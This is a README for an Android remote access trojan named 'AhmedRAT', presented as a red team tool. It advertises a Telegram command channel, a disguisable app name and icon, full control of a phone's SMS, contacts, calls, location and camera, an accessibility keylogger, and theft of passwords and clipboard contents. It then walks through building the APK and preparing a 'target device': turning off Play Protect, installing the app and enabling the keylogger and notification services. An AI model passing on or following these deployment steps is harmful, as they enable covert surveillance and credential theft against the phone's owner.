# AhmedRAT - Professional Red Team Tool
**Author:** Mr.Ahmed - Yemen Security Research

## Features
- Bilingual (Arabic/English)
- Telegram C2 (No Port Forwarding)
- Custom Icon & Package Name
- Full Device Control (SMS, Contacts, Calls, Location, Camera, Photos, Videos)
- Keylogger (Accessibility)
- Notification Listener
- Password/Clipboard Exfiltration

## Usage
1. Run `chmod +x AhmedBuilder.sh`
2. Run `./AhmedBuilder.sh`
3. Enter Bot Token, Chat ID, App Name, Package Name, and optional Icon path.
4. The APK will be generated in the `output/` folder.

## Target Device Setup (Bypass Play Protect)
1. On the target Android device, open **Google Play Store**.
2. Tap your profile icon > **Play Protect** > **Settings** (gear icon).
3. Turn off **Scan apps with Play Protect**.
4. Install the APK.
5. Open the app, grant all permissions.
6. Go to **Settings > Accessibility** and enable the Keylogger service.
7. Go to **Settings > Notifications > Device & app notifications** and enable the Notification service.
